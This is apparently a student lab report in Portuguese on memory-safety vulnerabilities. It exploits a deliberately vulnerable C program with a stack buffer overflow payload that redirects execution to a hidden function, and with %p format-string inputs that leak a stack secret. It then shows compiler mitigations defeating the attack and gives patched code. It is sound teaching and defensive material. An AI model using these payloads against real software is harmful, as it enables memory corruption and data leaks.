# Semana 11 - Laboratório de Vulnerabilidades de Segurança de Memória

# Parte A: Buffer Overflow de Stack (CWE-120)

## Exercício 1: Compilação sem mitigações

O programa foi compilado com o seguinte comando:
```bash
gcc -o vuln vuln.c -fno-stack-protector -z execstack -no-pie -g
```
**Explicação das Flags**

`-fno-stack-protector`: Desativa a proteção de stack, baseada em *stack canaries*. Desta forma, o programa não verifica se ocorreu corrupção da stack antes de retornar de uma função, o que torna possível explorar um buffer overflow para sobrescrever o endereço de retorno.

`-z execstack`: Marca a stack como executável. Esta opção era historicamente utilizada para permitir a execução de código injetado na stack durante ataques de buffer overflow.

`-no-pie`: Desativa a geração de executáveis do tipo *Position Independent Executable (PIE)*. Como consequência, o código do programa é carregado sempre nos mesmos endereços de memória, tornando previsíveis os endereços das funções e facilitando a exploração da vulnerabilidade.

`-g`: Adiciona símbolos de depuração ao executável, permitindo analisar o programa com o GDB e visualizar nomes de funções, variáveis e linhas do código-fonte.


## Exercício 2: Execução normal e exploração com GDB

Execução do programa:
```bash
./vuln "Hello"
```

Output obtido:
```
[*] process_input return address is on the stack.
[*] Buffer is at:         0x7ffeecfc2f00
[*] secret_function is at: 0x4011b6
[*] You entered: Hello
[*] Normal programme termination.

```

Chamada do GDB e comandos executados:
```bash
gdb -q ./vuln
```

```
(gdb) break process_input
(gdb) run Hello
(gdb) print &buffer
(gdb) info frame
(gdb) print (void*)secret_function
```

### 1. Qual é o endereço de buffer na stack?
O endereço do buffer na stack é `0x7fffffffdce0`.

### 2. Qual é o endereço do return address guardado (use info frame)?
O endereço do return address guardado é `0x7fffffffdd28`.

### 3. Quantos bytes separam o início de buffer do return address guardado?
`0x7fffffffdd28 - 0x7fffffffdce0 = 0x48 = 72 bytes.`

### 4. Qual é o endereço de secret_function ?
O endereço de `secret_function` é `0x4011b6`.


## Exercício 3: Desencadear o overflow

Com base na análise realizada no Exercício 2, foram obtidos os seguintes valores:

- Offset até ao return address: **72 bytes**
- Endereço de `secret_function`: **0x4011b6**

Em arquiteturas x86-64, os endereços são armazenados em formato *little-endian*. Assim, o endereço `0x4011b6` deve ser representado como:

```python
b"\xb6\x11\x40\x00\x00\x00\x00\x00"
```

Foi utilizado o seguinte comando para gerar o payload:

```bash
./vuln $(python3 -c "import sys; sys.stdout.buffer.write(b'A'*72 + b'\xb6\x11\x40\x00\x00\x00\x00\x00')")
```

Output obtido:
```
bash: warning: command substitution: ignored null byte in input
[*] process_input return address is on the stack.
[*] Buffer is at:         0x7ffe79be5100
[*] secret_function is at: 0x4011b6
[*] You entered: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�@

[!] ACCESS GRANTED: you reached the secret function!
[!] In a real exploit, this could be arbitrary code execution.

```

O aviso apresentado pela shell `ignored null byte in input` ocorre porque os argumentos da linha de comandos são terminados por bytes nulos `\x00`. Apesar de o bash remover esses bytes durante a substituição de comandos, os bytes significativos do endereço continuam a ser copiados para a stack, permitindo que o exploit funcione corretamente.

O ataque é bem sucedido, pois a chamada insegura a `strcpy` copia todos os bytes fornecidos pelo utilizador sem verificar o tamanho do buffer de destino. Após preencher os 64 bytes do buffer e os 8 bytes correspondentes ao *saved RBP*, perfazendo um total de 72 bytes de offset até ao return address. Os bytes seguintes sobrescrevem o *return address*, fazendo com que o fluxo de execução seja redirecionado para `secret_function()`.


## Exercício 4: Efeito das mitigações

Foi repetido o ataque desenvolvido no Exercício 3 após recompilar o programa com diferentes mitigações ativadas.

### Caso 1: Stack Canary ativo

Compilação:
```bash
gcc -o vuln vuln.c -z execstack -no-pie -g
```

Output do ataque:
```
[*] process_input return address is on the stack.
[*] Buffer is at:         0x7ffe4b1aa560
[*] secret_function is at: 0x4011d6
[*] You entered: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�@
*** stack smashing detected ***: terminated
Aborted (core dumped)
```

O ataque deixou de funcionar. Nesta configuração, o compilador introduz um *stack canary* entre as variáveis locais e o *return address*. Durante o *buffer overflow*, o *canary* é sobrescrito juntamente com o resto da stack. Antes de a função retornar, o valor do *canary* é verificado. Como este foi alterado, o programa deteta a corrupção da stack e termina imediatamente a execução.

### Caso 2: PIE/ASLR ativo

Compilação:
```bash
gcc -o vuln vuln.c -fno-stack-protector -z execstack -g
```

Output do ataque:
```
[*] process_input return address is on the stack.
[*] Buffer is at:         0x7fffea4f58b0
[*] secret_function is at: 0x61d8ed97f1c9
[*] You entered: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�@
Segmentation fault (core dumped)
```

O ataque deixa de funcionar, porque o executável passa a ser compilado como *Position Independent Executable (PIE)*, que em conjunto com  *Address Space Layout Randomization (ASLR)*, o endereço de `secret_function` varia entre execuções. Desta forma, o return address de `secret_function` não é mais previsível, pelo que o payload que tenta redirecionar a execução para um endereço fixo falha, resultando em *segmentation fault*.

### Caso 3: Todas as mitigações por defeito

Compilação:
```bash
gcc -o vuln vuln.c -g
```

Output do ataque:
```
[*] process_input return address is on the stack.
[*] Buffer is at:         0x7ffced038b50
[*] secret_function is at: 0x6541e4d6c1e9
[*] You entered: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�@
*** stack smashing detected ***: terminated
Aborted (core dumped)

```

O ataque deixa de funcionar, porque todas as mitigações estão ativas por defeito. O ataque falha imediatamente devido à deteção da corrupção da stack pelo mecanismo de *canary*. Mesmo que essa proteção não existisse, a aleatorização dos endereços de memória tornaria o endereço da função alvo imprevisível, dificultando significativamente a exploração da vulnerabilidade.


## Exercício 5: Remediação segura

Código corrigido:
```c
void process_input(char *input) {
    char buffer[64];

    printf("[*] Buffer is at: %p\n", (void *)buffer);
    printf("[*] secret_function is at: %p\n", (void *)secret_function);

    if (strlen(input) >= sizeof(buffer)) {
        fprintf(stderr, "Input too large!\n");
        return;
    }

    snprintf(buffer, sizeof(buffer), "%s", input);

    printf("[*] You entered: %s\n", buffer);
}
```

- A verificação do tamanho do input permite rejeitar inputs que excedam a capacidade do buffer.
- A utilização de `snprintf` em vez de `strcpy` garante que o buffer não seja sobrescrito, mesmo que a verificação falhe. 

Resultado da execução do ataque com todas as mitigações por defeito ativas:
```
[*] process_input return address is on the stack.
[*] Buffer is at:         0x7ffc7c0335f0
[*] secret_function is at: 0x61f00334b229
Input too large!
[*] Normal programme termination.
```

Desta forma, o programa torna-se seguro contra ataques de *buffer overflow*.
Assim, deixa de ser possível sobrescrever a *stack frame*, eliminando o risco de *buffer overflow* e as suas consequências, como a execução de código arbitrário ou corrupção de dados.


# Parte B: Vulnerabilidade de String de Formato (CWE-134)

## Exercício 6: Compilação e diagnósticos do compilador

Compilação:
```bash
gcc -o fmtvuln fmtvuln.c -g -Wall -Wformat -Wformat-security
```

Output do compilador:
```
fmtvuln.c: In function ‘process_input’:
fmtvuln.c:10:5: warning: format not a string literal and no format arguments [-Wformat-security]
   10 |     printf(input);             /* CWE-134: user input used as format string */
      |     ^~~~~~
```

A mensagem de aviso do compilador indica que a função `printf` está a ser chamada com um argumento que não é uma string literal, e que não há argumentos de formatação fornecidos. Este é um sinal claro de uma vulnerabilidade de string de formato, onde o input do utilizador é diretamente utilizado como a string de formato, permitindo que um atacante possa injetar especificadores de formato maliciosos para ler ou escrever na memória, ou até mesmo executar código arbitrário.

Execução do programa:
```bash
./fmtvuln "Hello, world!"
```

Output obtido:
```
[*] Address of secret on stack: 0x7ffd09c905b0
[*] Processing input...
Hello, world!
[*] Normal programme termination.
```

O programa comparta-se como esperado. Os avisos do GCC revelam ser importantes para detetar vulnerabilidades de segurança, no entanto, não impedem a compilação do programa, não garantem segurança em *runtime* e dependem da utilização explícita das flags adequadas durante a compilação.

## Exercício 7: Desencadear a vulnerabilidade

Execução do programa:
```bash
./fmtvuln "%p %p %p %p %p %p %p %p %p %p"
```

Output obtido:
```
[*] Address of secret on stack: 0x7ffd89dd0930
[*] Processing input...
0x1 0x1 0x7264d0b14907 0x7264d0c1ca70 0x7ffd89dd07ec 0x7ffd89dea000 0x7ffd89dd1253 0xcafebabe 0x6f3d716ca0fbc000 0x7ffd89dd0960
[*] Normal programme termination.
```

### 1. O que observa no output? Em que difere da execução normal no Exercício 6?

O output apresenta uma série de endereços de memória e valores hexadecimais, em vez da mensagem "Hello, world!" que foi exibida na execução normal. Isto ocorre porque os especificadores de formato `%p` estão a ser interpretados como instruções para imprimir os valores de ponteiros na stack.

### 2. Cada especificador %p faz com que o `printf` leia e imprima um valor com a largura de uma palavra a partir da stack da chamada. Num parágrafo curto, explique o mecanismo pelo qual isto ocorre: por que razão o `printf` não deteta que não foram passados argumentos correspondentes?

O `printf` não deteta a ausência de argumentos correspondentes porque a função é do tipo variádico, o que significa que o número e tipo de argumentos não são verificados em tempo de execução.

Em x86-64, os argumentos são passados através de registos e da stack segundo a convenção de chamada da arquitetura. O `printf` interpreta apenas a string de formato fornecida pelo utilizador e, para cada especificador encontrado (como %p), tenta ler o próximo valor disponível na stack ou registos, independentemente de esse valor ter sido realmente passado pela função chamadora.

Como não existe verificação de correspondência entre a string de formato e os argumentos fornecidos, o printf continua a ler memória adjacente, resultando em leitura arbitrária da stack.


### 3. Repita a experiência usando `%x` no lugar de `%p` . Que diferença, se alguma, observa no output? Qual dos especificadores é mais apropriado para um processo de 64 bits, e porquê?

Output obtido:
```
[*] Address of secret on stack: 0x7ffff622a670
[*] Processing input...
1 1 d5514907 d561ca70 f622a52c f63e7000 f622b253 cafebabe 4e737500 f622a6a0
[*] Normal programme termination.
```
Ao substituir `%p` por `%x`, observa-se que os valores impressos passam a ser apresentados como inteiros hexadecimais de 32 bits, em vez de pointers completos.

A principal diferença é que `%p` é o especificador apropriado para endereços de memória em sistemas de 64 bits, pois imprime valores com o tamanho de um pointer (64 bits). Já `%x` trunca os valores para 32 bits, podendo perder parte significativa da informação do endereço.

Assim, `%p` é mais adequado para análise de memória em arquiteturas 64-bit, enquanto `%x` pode mascarar ou truncar informação relevante.


## Exercício 8: Localizar um valor na stack

Execução do programa:
```bash
./fmtvuln "$(python3 -c "print('%p ' * 30, end='')")"
```

Output obtido:
```
[*] Address of secret on stack: 0x7ffcf022fdc0
[*] Processing input...
0x1 0x1 0x7df981d14907 0x7df981e1ca70 0x7ffcf022fc7c 0x7ffcf038c000 0x7ffcf0231216 0xcafebabe 0xe7818a7d72eef300 0x7ffcf022fdf0 0x5d00269842a5 0x7ffcf022ff08 0x2269840e0 0x2 0x7df981c29d90 (nil) 0x5d002698424d 0x2f022fef0 0x7ffcf022ff08 (nil) 0x5cbfc163913dabe1 0x7ffcf022ff08 0x5d002698424d 0x5d0026986da0 0x7df981f9d040 0xa34621266d39abe1 0xa74cc2e6abb1abe1 0x7df900000000 (nil) (nil) 
[*] Normal programme termination.
```

- O endereço de secret é `0x7ffcf022fdc0`.
- O valor `0xcafebabe` é encontrado na posição 8 da sequência de output gerado, o que significa que o segredo está localizado a 8 palavras (64 bytes) de distância do início da stack frame.

Este exercício demonstra que uma vulnerabilidade de string de formato permite a leitura arbitrária da stack do processo. Em particular, um atcante consegue:
- Ler valores que não foram explicitamente passados como argumentos.
- Localizar e aceder a variáveis locais e outros dados sensíveis armazenados na stack.

Este comportamento ocorre porque o `printf` interpreta a string de formato fornecida pelo utilizador e continua a ler memória da stack para satisfazer os especificadores `%p`, mesmo quando esses valores não foram fornecidos pela função chamadora.

Assim, esta vulnerabilidade permite a exposição de informação sensível residente na stack do processo, incluindo variáveis locais, ponteiros e dados potencialmente críticos.

## Exercício 9: Remediação segura

Código corrigido:
```c
void process_input(char *input) {
    unsigned long secret = 0xcafebabe;   /* a sensitive value resident on the stack */

    printf("[*] Address of secret on stack: %p\n", (void *)&secret);
    printf("[*] Processing input...\n");

    printf("%s", input);
    printf("\n");
}
```

A utilização de `printf("%s", input)` em vez de `printf(input)` garante que o input do utilizador é tratado como uma string literal. Assim, mesmo que o input contenha especificadores de formato, estes não serão interpretados como tais, mas sim exibidos como parte da strung.

Ao recompilar o programa com as flags de *warnings* `-Wall -Wformat -Wformat-security`, o compilador não emite qualquer aviso.
A execução do ataque resulta na string impressa literalmente como foi introduzida:

```
[*] Address of secret on stack: 0x7ffcaab63bf0
[*] Processing input...
%p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p 
[*] Normal programme termination.
```

Desta forma, o programa torna-se seguro contra ataques de string de formato, eliminando a possibilidade de leitura ou escrita arbitrária na memória através da exploração desta vulnerabilidade.
